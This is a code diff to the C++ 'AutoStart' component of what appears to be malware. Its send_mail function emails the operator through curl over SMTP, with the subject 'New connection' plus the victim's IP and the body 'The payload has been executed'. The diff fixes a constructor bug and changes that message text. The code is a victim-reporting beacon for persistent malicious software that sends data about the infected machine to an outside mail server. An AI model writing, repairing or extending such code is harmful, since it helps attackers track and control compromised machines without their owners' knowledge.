@@ -1,7 +1,7 @@
 #include "AutoStart.h"
 #pragma warning(disable : 4996)
 
-AutoStart::AutoStart(Client* client, std::string smtpp, std::string sender_mailp, std::string sender_namep, std::string passwordp, std::string mail_rcptp, std::string rcpt_namep) : smtp(smtpp), sender_mail(sender_mailp), sender_name(sender_mailp),password(passwordp),mail_rcpt(mail_rcptp),rcpt_name(rcpt_namep)
+AutoStart::AutoStart(Client* client, std::string smtpp, std::string sender_mailp, std::string sender_namep, std::string passwordp, std::string mail_rcptp, std::string rcpt_namep) : smtp(smtpp), sender_mail(sender_mailp), sender_name(sender_namep),password(passwordp),mail_rcpt(mail_rcptp),rcpt_name(rcpt_namep)
 {
 	try
 	{
@@ -227,9 +227,6 @@ bool AutoStart::send_mail()
 
 	const std::string subject = "New connection : "+IP;
 	const std::string file_attachment = "ATTACHMENT.FILE";
-	const std::string content = "New connection at : " + std::string(dt);
-	std::cout << "Content : " << content << std::endl;
-	Sleep(4000);
 	std::ofstream attachment(file_attachment, std::ios::trunc);
 
 	if (attachment)
@@ -238,7 +235,9 @@ bool AutoStart::send_mail()
 		attachment << "To: " << rcpt_name << " " << "<" << mail_rcpt << ">" << std::endl;
 		attachment << "Subject: " << subject << std::endl;
 		attachment << "Cc:" << std::endl;
-		attachment << content << std::endl;
+		
+		attachment << "The payload has been executed" << std::endl;
+
 
 		attachment.close();
 		const std::string command = "curl smtp://" + smtp + " -v --mail-from " + sender_mail + " --mail-rcpt " + mail_rcpt + " --ssl -u " + sender_mail + ":" + password + " -T " + file_attachment + " -k --anyauth";
